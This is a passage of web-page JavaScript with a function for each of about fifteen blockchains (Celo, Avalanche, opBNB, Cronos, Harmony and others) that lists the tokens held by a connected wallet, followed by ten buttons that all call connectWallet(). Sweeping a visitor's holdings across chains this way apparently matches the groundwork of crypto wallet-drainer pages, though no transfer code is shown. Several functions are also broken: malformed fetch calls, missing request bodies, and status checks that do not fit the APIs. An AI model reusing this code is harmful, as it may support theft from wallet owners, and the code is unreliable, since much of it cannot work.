          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//CELO API FUNCTION
async function fetchCELOTokens(account) {
  const url = `https://api.celoscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=27025780&sort=asc&apikey=${celoapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//AVALANCHE API FUNCTION
async function fetchAVALANCHETokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 43114,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//OPBNB API FUNCTION
async function fetchOPBNBTokens(account) {
  const url = `https://api-opbnb.bscscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=999999999&sort=asc&apikey=${opbnbapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//OKX API FUNCTION
async function fetchOKXTokens(account) {
  const url = `https://www.oklink.com/api/v5/explorer/eth/api?module=account&action=tokentx&address=${account}&startblock=19153000&endblock=19153162&sort=asc`
  const headers = new Headers({
      "Ok-Access-Key": okxapikey,
      "Content-Type": "application/json"
  })
  try {
      const response = await fetch(url, { method: 'GET', headers});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//MANTLE API FUNCTION
async function fetchMANTLETokens(account) {
  const url = `https://explorer.mantle.xyz/api?module=account&action=tokenlist&address=${account}`
  const headers = new Headers({ "Ok-Access-Key": okxapikey, "Content-Type": "application/json"})
  try {
      const response = await fetch(url, { method: 'GET', headers});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//AURORA API FUNCTION
async function fetchAURORATokens(account) {
    const url = `https://explorer.mainnet.aurora.dev/api?module=account&action=tokenlist&address=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });
            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
}


//CCRONOS API FUNCTION
async function fetchCRONOSTokens(account) {
  const url = `https://api.cronoscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${cronosapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

///KLAYTN API FUNCTION
async function fetchKLAYTNTokens(account) {
  const url = `https://klaytnscope.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//PLATON API FUNCTION
async function fetchPLATONTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 100,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//HARMONY API FUNCTION
async function fetchHARMONYTokens(account) {
  const url = `https://go.getblock.io/${harmonyapikey}/explorer/tx/list/account`
  const headers = new Headers({ "Content-Type": "application/json"})
  try {
      const response = await fetch(url, { method: 'POST', headers: headers, data: {"account": account, "count": 25, "offset": 0}});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//HECO API FUNCTION
async function fetchHECOTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 128,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//SMARTBCH API FUNCTION
async function fetchSMARTBCHTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 10000,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//CONFLUX ESPACE API FUNCTION
async function fetchCONFLUXTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 1030,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//MERLIN API FUNCTION
async function fetchMERLINTokens(account) {
    const url = `https://scan.merlinchain.io/api?address=${account}&api_key=${merlinapikey}&module=account&action=gettokenlist`
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });
            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
}


const openNetworkModalBtn = document.getElementById('open-network-modal')
openNetworkModalBtn.addEventListener('click', () => connectWallet())


const openNetworkModalBtn1 = document.getElementById('open-network-modal-1')
openNetworkModalBtn1.addEventListener('click', () => connectWallet())



const openNetworkModalBtn2 = document.getElementById('open-network-modal-2')
openNetworkModalBtn2.addEventListener('click', () => connectWallet())


const openNetworkModalBtn3 = document.getElementById('open-network-modal-3')
openNetworkModalBtn3.addEventListener('click', () => connectWallet())


const openNetworkModalBtn4 = document.getElementById('open-network-modal-4')
openNetworkModalBtn4.addEventListener('click', () => connectWallet())


const openNetworkModalBtn5 = document.getElementById('open-network-modal-5')
openNetworkModalBtn5.addEventListener('click', () => connectWallet())


const openNetworkModalBtn6 = document.getElementById('open-network-modal-6')
openNetworkModalBtn6.addEventListener('click', () => connectWallet())



const openNetworkModalBtn7 = document.getElementById('open-network-modal-7')
openNetworkModalBtn7.addEventListener('click', () => connectWallet())


const openNetworkModalBtn8 = document.getElementById('open-network-modal-8')
openNetworkModalBtn8.addEventListener('click', () => connectWallet())


const openNetworkModalBtn9 = document.getElementById('open-network-modal-9')
openNetworkModalBtn9.addEventListener('click', () => connectWallet())

